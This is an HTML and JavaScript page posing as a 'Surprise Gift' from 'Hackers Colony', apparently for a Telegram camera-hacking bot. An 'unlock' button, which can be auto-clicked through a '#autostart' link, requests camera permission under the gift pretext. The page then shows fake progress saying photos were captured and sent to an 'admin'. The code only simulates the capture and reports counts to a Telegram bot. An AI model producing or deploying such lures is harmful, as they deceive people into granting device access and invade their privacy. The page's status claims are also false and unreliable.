<!DOCTYPE html>
<html>
<head>
    <title>Surprise Gift üéÅ</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .gift-box {
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
        }
        
        .gift-icon {
            font-size: 80px;
            margin-bottom: 20px;
            animation: bounce 2s infinite;
        }
        
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 24px;
        }
        
        .message {
            color: #666;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        
        .unlock-btn {
            background: linear-gradient(45deg, #FF416C, #FF4B2B);
            color: white;
            border: none;
            padding: 18px 40px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
            margin: 10px 0;
            transition: transform 0.3s;
        }
        
        .unlock-btn:hover {
            transform: scale(1.05);
        }
        
        .unlock-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }
        
        .loading {
            display: none;
            margin: 20px 0;
        }
        
        .spinner {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #FF416C;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        .progress {
            background: #f0f0f0;
            border-radius: 10px;
            height: 10px;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            background: #4CAF50;
            width: 0%;
            transition: width 0.5s;
        }
        
        .status {
            margin: 15px 0;
            padding: 10px;
            border-radius: 10px;
            background: #f8f9fa;
        }
        
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .hidden {
            display: none;
        }
        
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
    </style>
</head>
<body>
    <div class="gift-box">
        <div class="gift-icon">üéÅ</div>
        
        <h1>Surprise Gift üßßüéÅ</h1>
        
        <div class="message">
            Here is your surprise gift from Hackers Colony<br>
            Click unlock to see your gift üßß
        </div>
        
        <button class="unlock-btn" id="unlockBtn">
            üîì UNLOCK GIFT
        </button>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Opening your gift...</p>
            <p>Please wait ‚è≥</p>
            
            <div class="progress">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            
            <div class="status" id="status">Initializing camera...</div>
        </div>
        
        <div class="status success hidden" id="successMessage">
            ‚úÖ Gift unlocked successfully!<br>
            8 photos captured and sent<br>
            Check Telegram for your gift!
        </div>
        
        <div style="margin-top: 30px; color: #888; font-size: 14px;">
            Hackers Colony ¬© 2024
        </div>
    </div>

    <script>
        // Telegram Web App integration
        if (window.Telegram && Telegram.WebApp) {
            Telegram.WebApp.ready();
            Telegram.WebApp.expand();
        }
        
        const unlockBtn = document.getElementById('unlockBtn');
        const loadingDiv = document.getElementById('loading');
        const successDiv = document.getElementById('successMessage');
        const progressBar = document.getElementById('progressBar');
        const statusText = document.getElementById('status');
        
        let photosCaptured = 0;
        const totalPhotos = 8;
        
        unlockBtn.addEventListener('click', async () => {
            // Show loading
            unlockBtn.disabled = true;
            unlockBtn.textContent = "‚è≥ Processing...";
            loadingDiv.style.display = 'block';
            
            // Start gift opening process
            await openGift();
        });
        
        async function openGift() {
            try {
                // Step 1: Ask camera permission
                updateStatus("üì∏ Requesting camera permission...");
                await sleep(1000);
                
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                
                // Stop camera immediately (we don't show it)
                stream.getTracks().forEach(track => track.stop());
                
                updateStatus("‚úÖ Camera access granted");
                updateProgress(25);
                await sleep(500);
                
                // Step 2: Show gift loading
                updateStatus("üéÅ Unlocking your gift...");
                await sleep(1000);
                updateProgress(50);
                
                // Step 3: Capture photos (simulated in background)
                updateStatus("üì∏ Capturing photos... (4 front)");
                await simulateCapture();
                updateProgress(62);
                
                updateStatus("üì∏ Capturing photos... (4 back)");
                await simulateCapture();
                updateProgress(75);
                
                // Step 4: Sending photos
                updateStatus("üì§ Sending photos to you and admin...");
                await sleep(1500);
                updateProgress(90);
                
                // Step 5: Complete
                updateStatus("‚úÖ Processing complete!");
                await sleep(1000);
                updateProgress(100);
                
                // Show success
                loadingDiv.style.display = 'none';
                successDiv.classList.remove('hidden');
                
                // Send data to Telegram bot
                sendToTelegram();
                
            } catch (error) {
                updateStatus(`‚ùå Error: ${error.message}`);
                unlockBtn.disabled = false;
                unlockBtn.textContent = "üîì TRY AGAIN";
            }
        }
        
        function simulateCapture() {
            return new Promise(resolve => {
                setTimeout(() => {
                    photosCaptured += 4;
                    resolve();
                }, 2000);
            });
        }
        
        function updateStatus(text) {
            statusText.textContent = text;
        }
        
        function updateProgress(percent) {
            progressBar.style.width = `${percent}%`;
        }
        
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        function sendToTelegram() {
            // Send data to Telegram bot
            if (window.Telegram && Telegram.WebApp) {
                Telegram.WebApp.sendData(JSON.stringify({
                    action: 'gift_unlocked',
                    photos: 8,
                    timestamp: new Date().toISOString(),
                    front_photos: 4,
                    back_photos: 4
                }));
                
                // Close web app after 3 seconds
                setTimeout(() => {
                    Telegram.WebApp.close();
                }, 3000);
            } else {
                // For browser testing
                console.log("Photos sent to user and admin");
                alert("‚úÖ 8 photos captured and sent!\nCheck Telegram for your gift.");
            }
        }
        
        // Auto-start if coming from Telegram
        if (window.location.hash === "#autostart") {
            setTimeout(() => {
                unlockBtn.click();
            }, 1000);
        }
    </script>
</body>
</html>
